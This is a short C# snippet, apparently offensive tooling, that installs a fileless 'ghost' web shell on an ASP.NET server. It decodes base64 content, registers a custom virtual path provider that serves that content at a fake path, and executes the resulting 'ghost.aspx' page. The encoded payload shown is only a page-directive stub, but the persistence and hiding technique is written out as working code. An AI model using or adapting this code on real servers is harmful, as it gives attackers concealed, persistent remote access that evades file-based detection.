class G
{
    void Install()
    {
        string webshellContentsBase64 = "PCVAIExhbmd1YWdlPSJDIyIlPg==";
        string webshellContent = System.Text.Encoding.UTF8.GetString(
            System.Convert.FromBase64String(webshellContentsBase64));
        string targetVirtualPath = "/fakepath/";
        System.Web.Hosting.HostingEnvironment.RegisterVirtualPathProvider(
            new SamplePathProvider(targetVirtualPath, webshellContent));
        System.Web.HttpContext.Current.Server.Execute(targetVirtualPath + "ghost.aspx");
    }
}
